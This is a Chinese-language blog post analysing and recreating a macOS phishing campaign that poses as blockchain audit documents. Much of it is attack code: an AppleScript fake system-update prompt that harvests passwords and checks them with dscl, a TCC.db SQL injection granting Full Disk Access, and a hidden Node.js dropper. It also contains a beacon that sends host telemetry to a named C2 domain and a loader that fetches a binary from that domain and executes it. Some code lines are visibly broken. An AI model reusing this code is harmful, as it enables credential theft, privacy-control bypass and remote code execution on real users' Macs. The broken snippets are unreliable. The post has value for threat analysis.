---
layout:     post
title:   macOS Token Vesting钓鱼攻击分析
subtitle:
date:       2026-02-16
author:     Closure
header-img: img/fmq.jpg
catalog: true
tags:
- 安全
---

最近有个基于mac的[Token Vesting钓鱼投毒](https://slowmist.medium.com/threat-intelligence-analysis-of-token-vesting-phishing-poisoning-50f39f5b9718 "Token Vesting钓鱼投毒")，看了下报告思路很有参考性

![ ](/img/20260216-1.png)

攻击者搞了个区块链审计的话术，通过邮件发送带有双扩展名的文件让受害者误以为是Word文档，实际上是AppleScript的脚本。运行之后脚本会启动mac虚假的系统更新界面并收集CPU架构和系统版本等基础信息回传给C2。

在后台，脚本会弹出仿真系统登录对话框，来诱导用户输入系统密码之后本地校验。在获取密码后利用脚本尝试直接修改macOS的TCC隐私数据库，还有通过sql注入手段静默开启摄像头麦克风等敏感权限来绕过系统的安全保护机制。

持久化这部分是部署了Node.js，搞了一个可动态扩展的远程控制框架，除了持续上报系统详细信息之外还能rce。

### 文件伪装

受全局属性AppleShowAllExtensions控制，Finder会隐藏已知的文件扩展名。所以当恶意文件被命名为xxx.docx.scpt时Finder解析逻辑会截断最后一段被识别的脚本后缀，从而在图形界面中仅显示为xxxx.docx。

先打开script editor写段基础逻辑，伪装系统更新弹窗然后获取输入显示出来。

```
display dialog "macOS 需要您的权限来修复 Office 文档显示问题。" & return & return & "请输入密码以允许此操作。" default answer "" with title "软件更新" with icon stop buttons {"取消", "好"} default button "好" with hidden answer

set fakePassword to text returned of result
display notification "用户输入的密码是: " & fakePassword with title “qwq"
```

切到桌面，把它的图标换成Microsoft Word的图标，随便找一个真的.docx，点Get Info里面的Word图标复制，再打开之前的脚本文件粘贴。但是在这次复现中发现macOS的现代版本已经引入了针对双后缀欺骗的Mitigations。试了从右向左覆盖字符和其他几个办法都不太行，所以最后.app换成了-……

![ ](/img/20260216-2.png)
![ ](/img/20260216-3.png)
![ ](/img/20260216-4.png)

再完善一下逻辑

```
set maxAttempts to 3
set attemptCount to 0
set processName to "Software Update"

repeat while attemptCount < maxAttempts
	try
		display dialog "macOS 需要您的密码以应用关键安全性更新。" & return & return & "请输入您的用户密码以继续：" default answer "" with title processName with icon note buttons {"取消", "安装更新"} default button "安装更新" with hidden answer
		
		set userPassword to text returned of result
		
		set userName to (do shell script "whoami")
		
		try
			do shell script "dscl /Local/Default -authonly " & userName & " " & quoted form of userPassword
			
			display notification "捕获到正确密码: " & userPassword with title "qwq"
			return
			
		on error
			display dialog "密码不正确，请重试。" with title processName with icon stop buttons {"好"} default button "好"
			set attemptCount to attemptCount + 1
		end try
		
	on error
		return
	end try
end repeat
```

`do shell script "dscl /Local/Default -authonly " & userName & " " & quoted form of userPassword`

主要是这段，dscl是macOS自带的账户管理工具，-authonly参数的作用是只验证密码对不对，不进行真正的登录操作。

传统的钓鱼脚本会把用户输的任何东西都发到c2，这个脚本只有当dscl验证通过时才会进入下一步，来确保拿到的是真实有效的密码。以及如果dscl验证失败脚本会捕获错误，弹出一个假的密码错误提示然后让用户重输，最多试3次。

![ ](/img/20260216-5.png)
![ ](/img/20260216-6.png)

⬆️在伪造的弹窗中输入密码后AppleScript会在后台通过 do shell script 发起一个包含用户名和所输入密码的验证指令。核心验证逻辑为对 dscl. -authonly <用户名> <密码> 命令的调用。如果操作系统的目录服务返回成功状态码，脚本便可确认该凭据是准确无误的明文密码。只有在这一本地验证环节通过后才会使用curl将用户名与经过Base64编码的密码发送至C2。

对比下其他常见的比如Keylogger，从实操来看使用OSA弹窗的隐蔽性远远>>>>>>Keylogger 。

键盘记录器毕竟在mac上有很大系统架构障碍，现在引入了极其严格的TCC框架，任何尝试通过底层API来全局挂钩和拦截键盘事件的应用程序，都必须向操作系统显式申请 kTCCServiceListenEvent 或 kTCCServiceAccessibility权限。

申请过程会不可避免地触发一个全屏的要求用户前往隐私与安全性中进行手动勾选的严重警告，基本上再蠢的人都会反应过来，且mac还有安全输入模式，当用户在合法的密码框中输入时系统会从内核层面切断第三方应用对键盘事件的读取。

相比之下使用osascript触发的对话框可以避开这些底层对抗，不涉及任何敏感底层API的调用，也不触发全局事件监听的TCC警告。

### TCC&SIP

获取到了系统密码之后，有了Root也无法直接读取邮件相册和私自开启摄像头和麦克风。

TCC框架是通过后台的tccd守护进程拦截所有应用程序对敏感资源的访问请求，这些权限的授权状态被硬编码存储在SQLite3 式的数据库文件TCC.db中。

在面对TCC和 SIP时，攻击逻辑不是Root 后修改文件，在 SIP 开启的macOS环境下，即使进程拥有Root权限，内核也会严格拦截对 ​`~/Library/Application Support/com.apple.TCC` 等受保护目录的直接篡改。

真实利用路径是FDA 宿主进程进行目录欺骗：

攻击者要实现“目录重命名”，核心必须依赖 完全磁盘访问权限，在实际操作中攻击者通常会利用那些由于管理员日常使用或系统默认已经拥有FDA权限的受信任系统应用，最典型的是Finder。

脚本会通过向Finder发送AppleEvents来迫使Finder在其拥有的FDA权限上下文中执行目录的重命名，从而解除tccd守护进程对数据库的锁定，如果直接使用未经FDA授权的Bash脚本执行mv必然会被系统内核直接拒绝。

当Finder将com.apple.TCC目录移走后，正在运行的tccd守护进程会瞬间丢失对原始`TCC.db文件的绝对锁定状态，紧接着脚本会在原位置新建一个com.apple.TCC目录，将备份中的TCC.db复制到这个不受系统实时保护的新目录中。

在这个时间窗口内新的TCC.db只是一个普通的SQLite数据库文件，不受到SIP和进程锁的严格排他性保护，所以可以进行SQL注入。

### 注入

Node.js权限的获取有一个注入与继承的误区，TCC守护进程在进行权限仲裁时，是基于调用该敏感API的实际二进制可执行文件，不是基于调用链的父进程。

Node.js运行时尝试调用摄像头或麦克风时系统会严格提取这个node二进制文件的代码签名要求，它不会因为是被拥有特权的Bash拉起的就继承任何免死金牌。

因此攻击者必须执行显式的 SQLite 注入，预先计算出受控机器上node二进制文件的真实代码签名，编译为二进制信任对象并转换为十六进制格式，攻击者随后还必须将这串精确匹配的csreq作为一条新记录，通过SQL的INSERT语句强行注入到脱离了锁定保护的 TCC.db的access表中。

几米粒老师发力写的

```
-- =========================================================
-- macOS Red Team Attack Chain Recreation
-- Based on: Token Vesting Phishing Campaign
-- Logic: Initial Access -> Credential Harvesting -> TCC Bypass -> Persistence
-- =========================================================

-- === Phase 1: Environmental Variables ===
set maxAttempts to 3
set attemptCount to 0
set processName to "Software Update" -- Masquerading as system process
set tccDBPath to "~/Library/Application Support/com.apple.TCC/TCC.db"
set backupPath to "~/Library/Application Support/com.apple.TCC.backup"

-- === Phase 2: Credential Harvesting (Fake Prompt + Local Auth) ===
repeat while attemptCount < maxAttempts
    try
        -- 2.1 Fake System Dialog (Visual Deception)
        display dialog "macOS 需要您的密码以应用关键安全性更新。" & return & return & "请输入您的用户密码以继续：" default answer "" with title processName with icon note buttons {"取消", "安装更新"} default button "安装更新" with hidden answer
        
        set userPassword to text returned of result
        set userName to (do shell script "whoami")
        
        -- 2.2 Local Verification (Living off the Land)
        try
            do shell script "dscl /Local/Default -authonly " & userName & " " & quoted form of userPassword
            
            -- If we are here, password is correct. Proceed to exploit.
            my executeAttackChain(userName, userPassword)
            return
            
        on error
            display dialog "密码不正确，请重试。" with title processName with icon stop buttons {"好"} default button "好"
            set attemptCount to attemptCount + 1
        end try
        
    on error
        return
    end try
end repeat

-- === Phase 3 & 4: TCC Bypass & Persistence (Weaponization) ===
on executeAttackChain(targetUser, targetPass)
    
    -- 3.1 Constructing the TCC Bypass Payload
    -- The CSREQ blob below is for 'com.apple.Terminal' (The hex string)
    set csreqBlob to "X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003'"
    
    -- The SQL Injection command to grant Full Disk Access
    set sqlInjection to "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, csreq, flags) VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.apple.Terminal', 0, 2, 1, 1, " & csreqBlob & ", 0);"
    
    -- 3.2 Simulating the Directory Spoofing Logic (The "Magic" Trick)
    set attackLog to "【攻击链执行报告】" & return & return & ¬
        "1. 凭据捕获: 成功 (用户: " & targetUser & ")" & return & ¬
        "2. 目录欺骗 (Directory Spoofing):" & return & ¬
        "   mv " & tccDBPath & " " & backupPath & return & ¬
        "   mkdir " & tccDBPath & return & ¬
        "   cp " & backupPath & "/TCC.db " & tccDBPath & return & ¬
        "3. SQL 注入 (TCC.db):" & return & ¬
        "   " & sqlInjection & return & ¬
        "4. 强制生效:" & return & ¬
        "   killall tccd"
        
    display dialog attackLog with title "Phase 3: TCC Bypass Simulation" with icon caution buttons {"继续 (模拟持久化)", "停止"} default button "继续 (模拟持久化)"
    
    if button returned of result is "继续 (模拟持久化)" then
        
        -- 4.1 Simulating Persistence (Launch Agent)
        set plistContent to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"...>
<key>ProgramArguments</key>
<array>
    <string>/Users/Shared/.hidden/node</string>
    <string>/Users/Shared/.hidden/index.js</string>
</array>
<key>RunAtLoad</key><true/>"
        
        display dialog "正在写入自启动配置文件..." & return & return & "~/Library/LaunchAgents/com.service.update.plist" & return & return & "Payload 内容预览:" & return & plistContent with title "Phase 4: Persistence" buttons {"完成复现"}
    end if
    
end executeAttackChain
```

在代码的模拟日志中能看到mv ...和mkdir ... 的操作，就像之前说的macOS的隐私数据库被(SIP和后台进程tccd看守着的，正常情况下Root也无法直接修改它。所以不能硬撞数据库文件。通过把父目录改名-tccd瞬间失去对原文件的锁定焦点-立刻新建一个同名目录把数据库拷回来。
INSERT OR REPLACE INTO access ... VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.apple.Terminal', 0, 2, ...);

- INSERT OR REPLACE：不管之前用户是否拒绝过终端访问文件，这条命令都会将其强行覆盖为允许。
- kTCCServiceSystemPolicyAllFiles：完全磁盘访问权限，一旦开启就可以读取邮件、聊天记录、浏览器Cookie等所有受保护数据。
- auth_value = 2：在 TCC 数据库定义中，0 代表不允许，1 代表未知，2 代表 “用户已允许”。

csreq在这里是因为苹果的TCC机制并不仅比对请求权限的应用程序包名，还会解析并验证二进制文件的底层签名要求，csreq字段存储的是一段经过十六进制编码的二进制Blob数据，代表了目标应用程序合法的苹果代码签名哈希与证书链结构。

为了确立这种授权的合法性必须预先提取目标宿主的确切代码签名要求，用 codesign -d -r- <app_path> 命令导出目标应用的原始签名规则，再使用csreq编译器转化为原生的二进制流，最后转换为十六进制字符串以供SQLite注入。

```
codesign -d -r- /System/Applications/Utilities/Terminal.app 2>&1 | awk -F ' => ' /designated/{print $2}' | csreq -r- -b /tmp/req.bin

xxd -p /tmp/req.bin | tr -d '\n' | tr 'a-z' 'A-Z'
```

⬆️是用codesign获取签名规则，再使用csreq将规则编译二进制，最后使用xxd转换为SQLite注入所需的格式。

在成功执行上述注入命令后脚本只需将篡改后的数据库目录恢复原位，当tccd自动重启并重新加载时就认为系统底层的Bash、终端及脚本天然拥有访问摄像头、麦克风和全部隐私文件的合法权限。

### 环境部署&C2

![ ](/img/20260216-7.png)
![ ](/img/20260216-8.png)

看下vt的env_arm.zip是针对苹果 Apple Silicon架构预编译的Node.js运行环境，为了确保后续的恶意脚本能够跨环境稳定运行，会直接自带运行库来提高后续payload成功率。

早期的探测逻辑会读取操作系统的架构信息，当侦测到目标主机搭载的是ARM架构时，C2会精准地定向下env_arm.zip的压缩包文件。

之后前置的Dropper脚本会解压并在家目录下构建一个隐蔽的运行时目录树，这个会创建一个.nodes的隐藏目录（和linux一样 在mac中以.开头的文件和目录默认在Finder和标准的终端列表命令中是不可见的。

解压后的目录内包含了一个完整的Node.js解释器以及支撑后续JS代码执行的核心依赖归档。

```
#!/bin/bash
WORK_DIR="$HOME/.nodes"
ARCHIVE_PATH="/tmp/origin" 
TARGET_ZIP="/tmp/env_arm.zip"

CPU_ARCH=$(uname -m)
if; then
    exit 1
fi

mv "$ARCHIVE_PATH" "$TARGET_ZIP"

mkdir -p "$WORK_DIR"

unzip -q "$TARGET_ZIP" -d "$WORK_DIR"

chmod +x "$WORK_DIR/node"

rm -f "$TARGET_ZIP"
```

部署完毕后是连接握手和payload获取，这里用的是基于HTTP协议的状态机加载序列，和攻击基础设施的网关进行多轮交互。

通过向C2的 /controller.php 端点发送带有不同req参数的请求将感染过程分解为三个互锁的逻辑阶段：

- 部署确认 (req=instd)： 确认 Node.js 运行环境已成功部署并获得执行权限。
- 策略同步 (req=tell)： 拉取加密密钥及轮询节奏，实现动态行为调整以规避流量监控。
- 载荷下发 (req=skip)： 在通过前两阶段验证后，服务器才会下发经过混淆的核心后门代码（index.js）。

如果蓝队仅捕获并尝试重放第三阶段的req=skip请求，由于缺少前序状态的激活记录服务器是会返回伪造数据的。

完成前置的状态机验证后Loader通过向C2发起req=skip请求，拉取JS代码。下发的脚本混淆之后以静态加密形式存在，下载完成之后Loader会在内存中直接进行解密，并利用Node.js的 eval()模块将代码注入当前的进程空间。

### 动态C2遥测

这个阶段是高频次的侦察-上报-待命循环，攻击者利用了Node.js跨平台标准库提供的系统接口，对受害者主机进行了全方位扫描：

- 操作系统内核与版本 (os.release(), os.version())：用于判断系统是否存在已知的未修补提权漏洞（如 CVE-2021-30869 等 macOS 内核漏洞），以便后续下发特定的内核态提权模块。
- CPU 微架构与核心配置 (os.cpus(), os.arch())：除了区分 Intel 与 ARM 外，获取物理/逻辑核心数量是经典的反沙箱（Anti-Sandbox）技术。自动化的恶意软件分析沙箱通常为了节省资源，仅分配 1 到 2 个虚拟 CPU 核心。如果检测到极低的核心数，恶意软件可能会判定自身处于分析环境中，从而终止执行或进入长期的休眠状态。
- 内存拓扑结构 (os.totalmem(), os.freemem())：同样用于反沙箱识别（沙箱通常配置极少的 RAM）。此外，还能评估当前系统的负载状态，避免在执行高资源消耗任务（如加密挖矿）时导致系统卡顿，进而引起用户的警觉。
- 磁盘布局与卷标 (disk layout)：探测系统中挂载的外部存储设备（如外接硬盘、企业网络共享盘 SMB/NFS）。这是针对高价值目标进行横向数据窃取和勒索软件扩散的先决条件 。
- 网络接口与路由表 (os.networkInterfaces())：提取本地 IP 地址、子网掩码和 MAC 地址。这不仅有助于识别受害者所处的网络环境（例如，是否处于特定的企业内网 IP 段），也为后续可能的局域网横向移动（Lateral Movement）提供了网段拓扑图 。
- 实时进程枚举 (running processes)：利用底层的子进程调用（如执行 ps -A 或解析 /proc 目录），提取当前系统正在运行的所有进程列表 。这是最为关键的一步，用于比对内置的黑名单（Blacklist）。如果列表中出现了诸如 Little Snitch（macOS 著名防火墙）、CrowdStrike Falcon 或 SentinelOne 等 EDR 代理的进程标识，index.js 可以立刻调整自身的通信频率或采用更高级的混淆手段。

上述收集到的数据会被封装进一个JS对象中,通过JSON格式进行序列化，最后会向C2发起包含该JSON的HTTP POST请求 。

```
const os = require('os');
const child_process = require('child_process');
const https = require('https');
const crypto = require('crypto');


function gatherSystemTelemetry() {
    let processList =;
    try {

        const psOutput = child_process.execSync('ps -axo pid,comm', { encoding: 'utf-8' });
        processList = psOutput.split('\n').filter(line => line.length > 0);
    } catch (e) {
        processList = ["Error: Process enumeration failed"];
    }

    const telemetry = {
        identifier: generateMachineID(), 
        platform: os.platform(),        
        os_version: os.release(),
        architecture: os.arch(),
        cpu_model: os.cpus().model,
        cpu_cores: os.cpus().length,
        memory_total: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + " GB",
        network_interfaces: parseNetworkInterfaces(os.networkInterfaces()),
        running_processes: processList, 
        timestamp: new Date().toISOString()
    };

    return telemetry;
}


function parseNetworkInterfaces(interfaces) {
    const netInfo = {};
    for (const [name, data] of Object.entries(interfaces)) {
        netInfo[name] = data.map(info => ({
            family: info.family,
            address: info.address,
            mac: info.mac
        }));
    }
    return netInfo;
}


function generateMachineID() {
    const interfaces = os.networkInterfaces();
    let macStr = '';
    for (const key in interfaces) {
        if (interfaces[key] && interfaces[key].mac!== '00:00:00:00:00:00') {
            macStr += interfaces[key].mac;
        }
    }

    return crypto.createHash('sha256').update(macStr).digest('hex').substring(0, 16);
}


function registerWithC2() {
    const payloadObject = gatherSystemTelemetry();
    const jsonString = JSON.stringify(payloadObject);
    
    const base64Payload = Buffer.from(jsonString).toString('base64');
    const postData = `data=${encodeURIComponent(base64Payload)}`;

    const options = {
        hostname: 'sevrrhst.com',
        port: 443,
        path: '/inc/register.php?req=init', 
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'X-Bot-ID': payloadObject.identifier 
        }
    };

    const req = https.request(options, (res) => {
        let responseBody = '';
        res.on('data', (chunk) => { responseBody += chunk; });
        res.on('end', () => {
            if (res.statusCode === 200 && responseBody.length > 0) {
                executeDynamicPayload(responseBody);
            }
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with C2 communication: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

registerWithC2();
```

### 无文件执行

在通过系统指纹提交到C2后，攻击者会用Node.js内置的eval()函数开启内存级代码执行模式，通过将c2发Base64指令流直接投喂给V8引擎进行JIT来实现零磁盘I/O的攻击链。

并且Node.js的执行框架为攻击者劫持Electron架构应用比如Discord和VS Code提供了便利，这些应用本质上是Chromium与Node.js的结合体，脚本可以轻易跨越边界来定位篡改核心配置文件（。

### 原生二进制回退与权限继承

但是在某些涉及特定系统底层中断和解密浏览器的key3.db/logins.json或者绕过高级内存防护机制时，还是需要依靠传统的操作系统级原生二进制文件。

这个框架的设计者准备了一条回退路线，当C2服务器判定仅凭JS无法完成目标时就不再通过 eval()下发纯文本脚本，转而下发一个addon.js的辅助装载器脚本。

addon.js被动态加载并执行后唯一的任务是充当一个二进制数据的管道，它会向C2的另一个专用端点发起请求，拉取经过Base64编码的原生编译期二进制数据流 。

```
const fs = require('fs');
const https = require('https');
const child_process = require('child_process');
const path = require('path');
const os = require('os');

const BINARY_PAYLOAD_URL = 'https://sevrrhst.com/inc/register.php?req=next';

https.get(BINARY_PAYLOAD_URL, (res) => {
    let base64Stream = '';
    
    res.on('data', (chunk) => {
        base64Stream += chunk;
    });

    res.on('end', () => {
        if (base64Stream.length > 0) {
            try {
                const binaryBuffer = Buffer.from(base64Stream, 'base64');
                
                const executablePath = path.join(os.homedir(), '.nodes', 'node_addon');
                
                fs.writeFileSync(executablePath, binaryBuffer);

                fs.chmodSync(executablePath, '755');
                

                child_process.exec(`${executablePath} > /dev/null 2>&1 &`, (error) => {
                    if (error) {
                        console.error(`Native addon execution encountered an issue: ${error.message}`);
                    }
                });
                
            } catch (err) {
                console.error("Failed to process the native binary payload.");
            }
        }
    });
});
```

这种混合持久化策略在设计上挺亮眼的，因为前置的攻击阶段AppleScript初始诱导期可能已经通过混淆手段诱使用户输入了系统管理密码，此时由后台悄悄派生的node_addon进程将直接继承这些已被破解的顶级权限，能够在不触发操作系统任何系统级隐私访问弹窗的情况下，自由地截取屏幕录制音频和网络外传。

> 

在macOS 13+中的SIP防护从单一文件扩展至路径完整性，即便是拥有FDA权限的 Finder在尝试对com.apple.TCC目录进行重命名或删除时也可能触发行核层面的拦截。

> 以及现代tccd守护进程还会严格核对目录的Inode和扩展属性，通过mv替换目录的操作会导致Inode变更，触发系统的自愈机制并重置为原始空白数据库，让我们注入的SQL记录瞬间失效。

> TCC权限和Client ID csreq强绑定，针对终端的权限注入无法涵盖自建的Node.js载荷，配合背景任务管理的实时弹窗监控，任何对持久化配置或敏感权限的非法微调都难以实现真正的静默入侵。

